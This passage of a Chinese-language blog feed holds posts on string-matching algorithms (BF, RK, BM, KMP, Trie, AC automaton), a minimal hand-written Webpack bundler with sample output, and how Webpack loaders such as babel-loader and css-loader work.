      <content type="html"><![CDATA[<p>单模式串匹配：一个串跟一个串进行匹配 - BF, RK, BM, KMP算法<br>多模式串匹配：一个串中同时查找多个串 - Trie树和AC自动机</p><p>我们在字符串A中查找字符串B，那字符串A就是主串，字符串B就是模式串。主串的长度记作n，模式串的长度记作m。</p><p>需求：这是一个简单的搜索功能，在你输入一段字符后会得到后端返回的搜索结果，此时需要将你输入的字符串在搜索结果中变色。</p><h3 id="1-BF算法"><a href="#1-BF算法" class="headerlink" title="1. BF算法"></a>1. BF算法</h3><p>Brute Force，暴力匹配算法，在主串中，检查起始位置分别是 0,1,2…n-m 且长度为 m 的 n-m+1个子串，看有没有跟模式串匹配的。<br><img src="/2022/01/13/LeetCode-字符串匹配/1.jpg"></p><p>在极端情况下主串是<code>&#39;aaa...aaa(n个a)&#39;</code>，模式串是<code>&#39;aaaab&#39;</code>，我们每次都要对比m个字符，对比n-m+1次，最坏情况的时间复杂度是O(n*m)</p><p><br></p><h3 id="2-RK算法"><a href="#2-RK算法" class="headerlink" title="2. RK算法"></a>2. RK算法</h3><p>BF算法只是简单粗暴地对两个字符串的所有字符依次比较，而RK算法比较的是两个字符串的[ 哈希值 ]。</p><p>每一个字符串都可以通过某种哈希算法，转换成一个整型数，<code>hashcode = hash(string)</code>。生成hashcode的算法很多，比如：按位相加。把a当做1，b当做2，c当做3…然后把字符串的所有字符相加，相加结果就是它的hashcode。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bce = <span class="number">2</span> + <span class="number">3</span> + <span class="number">5</span> = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>这个算法虽然简单，却很可能产生hash冲突。比如bce, bec, cbe的hashcode是一样的。由于存在hash冲突的可能，我们还需要像BF算法那样，对两个字符串逐个字符比较，最终判断出两个字符串匹配。</p><p>理想情况下，RK算法的时间复杂度是O(n)。极端情况下，哈希算法大量冲突，时间复杂度退化为O(m*n)。</p><p><br></p><h3 id="3-BM算法"><a href="#3-BM算法" class="headerlink" title="3. BM算法"></a>3. BM算法</h3><p>BM算法核心思想是，利用模式串本身的特点，在模式串中某个字符与主串不能匹配的时候，将模式串往后多华东几位，以此来减少不必要的字符比较，提高匹配的效率。</p><p>当遇到不匹配的字符时，有什么固定的规律，可以将模式串往后多滑动几位呢？BM算法，就是在寻找这种规律。</p><ul><li>坏字符串规则</li><li>好后缀规则</li></ul><p><br></p><h3 id="4-KMP算法"><a href="#4-KMP算法" class="headerlink" title="4. KMP算法"></a>4. KMP算法</h3><p>在模式串和主串匹配过程中，把不能匹配的那个字符仍然叫做 坏字符，把已经匹配的那段字符叫做 好前缀。</p><h3 id="5-Trie数"><a href="#5-Trie数" class="headerlink" title="5. Trie数"></a>5. Trie数</h3><p>如何实现搜索引擎的搜索关键词提示功能？</p><p>Trie树的本质，就是利用字符串质检的公用前缀，将重复的前缀合并在一起。<br>Ttie树主要有两个操作，一个是将字符串集合构造成Trie数。另一个是在Trie树种查询一个字符串。</p><p>实际上Trie只是不适合精确匹配查找，比较适合的是查找前缀匹配的字符串。Trie数可以应用到自动输入补全，比如输入法自动补全功能，IDE代码编辑器自动补全功能，浏览器网址输入的自动补全。</p><h3 id="6-AC自动机"><a href="#6-AC自动机" class="headerlink" title="6. AC自动机"></a>6. AC自动机</h3><p>很多支持用户发表文本内容的网站，如BBS，大都有敏感词过滤功能，用来过滤掉用户输入的一些内容。通过维护一个敏感词的字典，当用户输入一段文字内容后，通过字符串匹配算法，来查找用户输入的这段文字，是否包含敏感词，如果有，就用<code>***</code>替代掉。</p><p>多模式串匹配算法，就是在多个模式串和一个主串之间做匹配，也就是在一个主串中查找多个模式串。</p><ul><li><a href="https://mp.weixin.qq.com/s/67uf7pRxXh7Iwm7MMpqJoA" target="_blank" rel="noopener">什么是字符串匹配算法？</a></li><li><a href="https://juejin.im/post/5a30c011f265da43333e63b9" target="_blank" rel="noopener">一个需求引发的算法及优化(KMP算法)</a></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>官方教你手写一个100行代码的Webpack</title>
      <link href="/2021/12/22/webpack%E6%89%8B%E5%86%99/"/>
      <url>/2021/12/22/webpack%E6%89%8B%E5%86%99/</url>
      <content type="html"><![CDATA[<blockquote><p>Webpack如何实现打包功能？<br>最近看文章刷到这个<a href="https://www.youtube.com/watch?v=Gc9-7PBqOC8&amp;list=LLHK1mTHpwrUeYgF5gu-Kd4g" target="_blank" rel="noopener">官方教学视频</a>，666啊，建议先进去看一看！</p></blockquote><p><br></p><h3 id="1-打包文件分析"><a href="#1-打包文件分析" class="headerlink" title="1. 打包文件分析"></a>1. 打包文件分析</h3><p>首先webpack构建出的<code>bundle.js</code>长这样。整个代码是一个自执行函数，函数接收的是一个数组，数组的每一项是一个模块，它们也被一个函数包裹起来。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">modules</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 模拟require语句</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_webpack_require__</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 执行存放所有模块数组中的第0个模块</span></span><br><span class="line">  _webpack_require__[<span class="number">0</span>]</span><br><span class="line">&#125;)([<span class="comment">/* 存放所有模块的数组 */</span>module0, module1])</span><br></pre></td></tr></table></figure></p><p>webpack如何处理<code>import</code>和<code>require</code>?<br>bundle.js能直接运行在浏览器中的原因在于输出的文件中定义了一个<code>_webpack_require__</code>函数，来模拟Node.js.中的<code>require</code>语句</p><p><br></p><h3 id="2-实现一个简单的webpack"><a href="#2-实现一个简单的webpack" class="headerlink" title="2. 实现一个简单的webpack"></a>2. 实现一个简单的webpack</h3><p>Webpack通过入口文件逐层遍历到模块依赖，进行代码分析，转换，最终生成可在浏览器运行的打包后的代码。</p><ul><li>解析入口文件，获取AST</li><li>从AST中找到import生成，找出所有依赖模块</li><li>AST转换为可执行的code</li><li>递归生成所有依赖项，生成依赖关系图</li><li>重写require函数，输出bundle（一个立即执行函数，一个require函数，所有module）<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> babylon = <span class="built_in">require</span>(<span class="string">'babylon'</span>)</span><br><span class="line"><span class="keyword">const</span> traverse = <span class="built_in">require</span>(<span class="string">'babel-traverse'</span>).default</span><br><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">'babel-core'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ID = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 解析文件，生成这个模块的code, 提取依赖</span></span><br><span class="line"><span class="comment"> * accept a path to a file, read its contents, and extract its dependencies</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createAsset</span> (<span class="params">filePath</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 读取文件，生成ast</span></span><br><span class="line">  <span class="keyword">const</span> content = fs.readFileSync(filePath, <span class="string">'utf-8'</span>)</span><br><span class="line">  <span class="keyword">const</span> ast = babylon.parse(content, &#123;</span><br><span class="line">    sourceType: <span class="string">'module'</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 读取代码中的import声明，获取这个模块的依赖模块</span></span><br><span class="line">  <span class="keyword">const</span> dependencies = []</span><br><span class="line">  traverse(ast, &#123;</span><br><span class="line">    ImportDeclaration: <span class="function">(<span class="params">&#123; node &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      dependencies.push(node.source.value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将模块代码用babel-preset-env转一下</span></span><br><span class="line">  <span class="keyword">const</span> id = ID++</span><br><span class="line">  <span class="keyword">const</span> &#123; code &#125; = babel.transformFromAst(ast, <span class="literal">null</span>, &#123;</span><br><span class="line">    presets: [<span class="string">'env'</span>]</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    id, <span class="comment">// moduleId</span></span><br><span class="line">    filePath, <span class="comment">// filePath</span></span><br><span class="line">    dependencies, <span class="comment">// 模块依赖的模块</span></span><br><span class="line">    code <span class="comment">// 模块代码</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 从入口文件，递归生成所有依赖</span></span><br><span class="line"><span class="comment"> * Now that we can extract the dependencies of a single module, we are going to</span></span><br><span class="line"><span class="comment"> * start by extracting the dependencies of the entry file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createGraph</span> (<span class="params">entry</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// entry: the main file of our application</span></span><br><span class="line">  <span class="keyword">const</span> mainAsset = createAsset(entry)</span><br><span class="line">  <span class="keyword">const</span> queue = [mainAsset]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> asset <span class="keyword">of</span> queue) &#123;</span><br><span class="line">    <span class="keyword">const</span> dirname = path.dirname(asset.filePath)</span><br><span class="line"></span><br><span class="line">    asset.mapping = &#123;&#125;</span><br><span class="line">    asset.dependencies.forEach(<span class="function"><span class="params">relativePath</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> absolutePath = path.join(dirname, relativePath)</span><br><span class="line">      <span class="keyword">const</span> child = createAsset(absolutePath)</span><br><span class="line">      asset.mapping[relativePath] = child.id</span><br><span class="line">      queue.push(child)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> queue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 生成bundle.js的code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bundle</span> (<span class="params">graph</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> modules = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 传送module，使用了CommonJS的模块标准，他们需要require, module, exports这3个可用的方法</span></span><br><span class="line">  <span class="comment">// 因为浏览器不支持，所以我们会自己实现它</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// the code of each module wrapped with a function</span></span><br><span class="line">  <span class="comment">// This is because modules should be scoped</span></span><br><span class="line">  <span class="comment">// Defining a variable in on module shouldn't affect others of the global scope</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// When we transpile our modules, use the CommonJS module system</span></span><br><span class="line">  <span class="comment">// They expect a `require`, a `module` and an `exports` objects to be available</span></span><br><span class="line">  <span class="comment">// Those are not normally available in the browser </span></span><br><span class="line">  <span class="comment">// so we will implement them and inject them into our function wrappers</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// For the second value, we stringify the mapping between a module and its dependencies. </span></span><br><span class="line">  <span class="comment">// This is an object that looks like this:</span></span><br><span class="line">  <span class="comment">// &#123; './relative/path': 1 &#125;</span></span><br><span class="line">  graph.forEach(<span class="function"><span class="params">mod</span> =&gt;</span> &#123;</span><br><span class="line">    modules += <span class="string">`<span class="subst">$&#123;mod.id&#125;</span>: [</span></span><br><span class="line"><span class="string">      function (require, module, exports) &#123;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;mod.code&#125;</span></span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(mod.mapping)&#125;</span></span></span><br><span class="line"><span class="string">    ],`</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 立即执行函数</span></span><br><span class="line">  <span class="comment">// 定义`require()`</span></span><br><span class="line">  <span class="keyword">const</span> result = <span class="string">`</span></span><br><span class="line"><span class="string">    (function (modules) &#123;</span></span><br><span class="line"><span class="string">      function require(id) &#123;</span></span><br><span class="line"><span class="string">        const [fn, mapping] = modules[id]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        function localRequire (relativePath) &#123;</span></span><br><span class="line"><span class="string">          return require(mapping[relativePath])</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        const module = &#123; exports: &#123;&#125; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        fn(localRequire, module, module.exports)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return module.exports</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      require(0)</span></span><br><span class="line"><span class="string">    &#125;)(&#123;<span class="subst">$&#123;modules&#125;</span>&#125;)</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> graph = createGraph(<span class="string">'./entry.js'</span>)</span><br><span class="line"><span class="keyword">const</span> result = bundle(graph)</span><br><span class="line"><span class="built_in">console</span>.log(result)</span><br></pre></td></tr></table></figure></li></ul><p>我们写一个demo，执行<code>node bundle.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entry.js</span></span><br><span class="line"><span class="keyword">import</span> message <span class="keyword">from</span> <span class="string">'./message.js'</span></span><br><span class="line"><span class="built_in">console</span>.log(message)</span><br><span class="line"></span><br><span class="line"><span class="comment">// message.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; name &#125; <span class="keyword">from</span> <span class="string">'./name.js'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// name.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> name = <span class="string">'123'</span></span><br></pre></td></tr></table></figure></p><p>输出的result，把代码放到浏览器控制台，执行后输出<code>hello 123</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">modules</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> [fn, mapping] = modules[id]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// lcoalRequire(relativePath) = require(moduleId)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">localRequire</span> (<span class="params">relativePath</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">require</span>(mapping[relativePath])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义module, moduleExport，执行模块内的代码，返回module.exports</span></span><br><span class="line">    <span class="comment">// 因此 require(id) 返回值是模块的module.exports</span></span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">module</span> = &#123; <span class="attr">exports</span>: &#123;&#125; &#125;</span><br><span class="line">    fn(localRequire, <span class="built_in">module</span>, <span class="built_in">module</span>.exports)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>.exports</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">require</span>(<span class="number">0</span>)</span><br><span class="line">&#125;)(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="number">0</span>: [</span><br><span class="line">      <span class="function"><span class="keyword">function</span> (<span class="params">require, module, exports</span>) </span>&#123;</span><br><span class="line"><span class="meta">        "use strict"</span>;</span><br><span class="line">        <span class="keyword">var</span> _message = <span class="built_in">require</span>(<span class="string">"./message.js"</span>);</span><br><span class="line">        <span class="keyword">var</span> _message2 = _interopRequireDefault(_message);</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_interopRequireDefault</span>(<span class="params">obj</span>) </span>&#123; </span><br><span class="line">          <span class="keyword">return</span> obj &amp;&amp; obj.__esModule ? obj : &#123; <span class="attr">default</span>: obj &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(_message2.default);</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;<span class="string">"./message.js"</span>:<span class="number">1</span>&#125;</span><br><span class="line">    ],</span><br><span class="line">  <span class="number">1</span>: [</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">require, module, exports</span>) </span>&#123;</span><br><span class="line"><span class="meta">      "use strict"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(exports, <span class="string">"__esModule"</span>, &#123;</span><br><span class="line">        value: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> _name = <span class="built_in">require</span>(<span class="string">"./name.js"</span>);</span><br><span class="line">      exports.default = <span class="string">"hello "</span> + _name.name;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;<span class="string">"./name.js"</span>:<span class="number">2</span>&#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="number">2</span>: [</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">require, module, exports</span>) </span>&#123;</span><br><span class="line"><span class="meta">      "use strict"</span>;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(exports, <span class="string">"__esModule"</span>, &#123;</span><br><span class="line">        value: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">var</span> name = exports.name = <span class="string">'111'</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;&#125;</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.youtube.com/watch?v=Gc9-7PBqOC8&amp;list=LLHK1mTHpwrUeYgF5gu-Kd4g" target="_blank" rel="noopener">官方视频</a></li><li><a href="https://github.com/ronami/minipack/blob/master/src/minipack.js" target="_blank" rel="noopener">代码仓库</a></li><li><a href="https://imweb.io/topic/5a4cce35a192c3b460fce39b" target="_blank" rel="noopener">Webpack原理-输出文件分析</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Webpack Loader的输入输出是什么？</title>
      <link href="/2021/12/05/Webpack-loader/"/>
      <url>/2021/12/05/Webpack-loader/</url>
      <content type="html"><![CDATA[<p>在Webpack中，可以把loader看作一个数据管道，输入一个字符串或者 <code>Buffer</code>，然后经过加工，输出另一个字符串。多个loader可以像水管一样串联起来。</p><p>Loader 用于处理任意类型的文件，并且将它们转换成一个让 Webpack 可以处理的有效模块，在 Webpack 打包之前执行。</p><p>Loader的一些特点：</p><ul><li><code>Loader</code> 是一个 <code>node</code> 模块；</li><li><code>Loader</code> 可以处理任意类型的文件，转换成 <code>webpack</code> 可以处理的模块；</li><li><code>Loader</code> 可以在 <code>webpack.config.js</code> 里配置，也可以在 <code>require</code> 语句里内联；</li><li><code>Loader</code> 根据配置从右向左链式执行；</li><li><code>Loader</code> 接受源文件内容字符串或者 <code>Buffer</code>；</li><li><code>Loader</code> 分为多种类型：同步、异步和 <code>pitching</code>，他们的执行流程不一样；</li><li><code>webpack</code> 为 <code>Loader</code> 提供了一个上下文，有一些 <code>api</code> 可以使用；</li></ul><p><br></p><h3 id="1-最简单的loader"><a href="#1-最简单的loader" class="headerlink" title="1. 最简单的loader"></a>1. 最简单的loader</h3><p>最简单的loader是一个什么都不做，原样返回JS代码的 loader<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">source</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> source</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-babel-loader"><a href="#2-babel-loader" class="headerlink" title="2. babel-loader"></a>2. babel-loader</h3><p>接收<code>source</code>源码，用<code>babel</code>编译一下，返回编译后的代码。presets 代表转码规则<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">'babel-core'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">source</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> babelOptions = &#123;</span><br><span class="line">    presets: [<span class="string">'env'</span>], </span><br><span class="line">    plugins: [<span class="string">"transform-react-jsx"</span>] <span class="comment">// 编译jsx</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> result = babel.transform(source, babelOptions)</span><br><span class="line">  <span class="keyword">return</span> result.code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>JSX会被编译为一个名为<code>h</code>的函数调用，也就是<code>React.createElement</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译前</span></span><br><span class="line">&lt;p&gt;KaSong&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 编译后</span></span><br><span class="line"><span class="regexp">h('p', null, 'KaSong')</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-css-loader"><a href="#3-css-loader" class="headerlink" title="3. css-loader"></a>3. css-loader</h3><p>一般css的loader都是这样配置<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [<span class="string">'style-loader'</span>, <span class="string">'css-loader'</span>, <span class="string">'less-loader'</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><code>less-loader</code>, <code>scss-loader</code>将less、scss编译成css代码</li><li><code>css-loader</code>处理css中的<code>@import</code>和<code>url</code>这样的外部资源</li><li><code>style-loader</code>把样式插入到DOM中，在head中插入一个style标签，并把样式写入到这个标签的innerHTML里。</li></ul><p>css-loader 的主要代码包含这两部分：</p><ul><li>processCss.js 中会调用 postcss 对 css 源码进行解析，然后遍历其中的 declaration 并抽离出 url 和 import 这两种依赖</li><li>loader.js 会调用 processCss，根据它已经分析出的 url 和 import 依赖关系，在对应的代码中替换成 require，并拼接成段最终的JS返回</li></ul><p><br></p><h4 id="3-1-css-modules-局部样式"><a href="#3-1-css-modules-局部样式" class="headerlink" title="3.1 css modules: 局部样式"></a>3.1 css modules: 局部样式</h4><p>CSS的规则都是全局的，任何一个组件的样式规则，都对整个页面有效。产生局部作用域的唯一方法，就是使用一个独一无二的class的名字，不会与其他选择器重名。这就是 CSS Modules 的做法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.js</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> style <span class="keyword">from</span> <span class="string">'./App.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;h1 className=&#123;style.title&#125;&gt;</span><br><span class="line">      Hello World</span><br><span class="line">    &lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ App.css</span></span><br><span class="line"><span class="regexp">.title &#123;</span></span><br><span 